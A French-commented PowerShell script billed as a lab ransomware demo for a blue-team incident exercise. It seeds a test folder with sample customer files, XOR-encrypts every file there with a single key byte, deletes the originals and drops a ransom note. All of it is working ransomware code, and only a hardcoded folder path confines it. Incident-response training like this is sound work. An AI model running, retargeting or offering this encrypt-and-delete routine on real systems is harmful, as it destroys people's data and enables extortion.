# ============================================================
# DEMO RANSOMWARE SCRIPT — LAB UNIQUEMENT
# Cible : C:\TestRansom\ SEULEMENT (dossier non critique)
# NE JAMAIS utiliser sur de vrais fichiers
# ============================================================

$key = [System.Text.Encoding]::UTF8.GetBytes("SecureBank2024Key!")
$targetFolder = "C:\TestRansom"

# Vérifier que le dossier cible existe
if (-not (Test-Path $targetFolder)) {
    New-Item -ItemType Directory -Path $targetFolder | Out-Null
    Set-Content "$targetFolder\test1.txt" "Customer: Alice, Balance: 5000"
    Set-Content "$targetFolder\test2.txt" "Customer: Bob, Balance: 12000"
    Write-Host "[+] Dossier de test créé avec fichiers exemples"
}

Write-Host "[*] Début du chiffrement XOR de $targetFolder ..."

Get-ChildItem -Path $targetFolder -File | Where-Object { $_.Extension -ne ".locked" -and $_.Name -ne "RANSOM_NOTE.txt" } | ForEach-Object {
    $content = [System.IO.File]::ReadAllBytes($_.FullName)
    $encrypted = $content | ForEach-Object { $_ -bxor $key[0] }
    [System.IO.File]::WriteAllBytes($_.FullName + ".locked", $encrypted)
    Remove-Item $_.FullName
    Write-Host "[+] Chiffré : $($_.Name)"
}

Set-Content "$targetFolder\RANSOM_NOTE.txt" @"
!!! VOS FICHIERS ONT ETE CHIFFRES !!!

Ceci est une demonstration de lab — SecureBank Incident Project.

Pour restaurer : contacter l'administrateur Blue Team.
Cle de dechiffrement : SecureBank2024Key!

[SIMULATION UNIQUEMENT — Aucun vrai fichier affecte]
"@

Write-Host "[!] Chiffrement terminé. Note de rançon déposée."
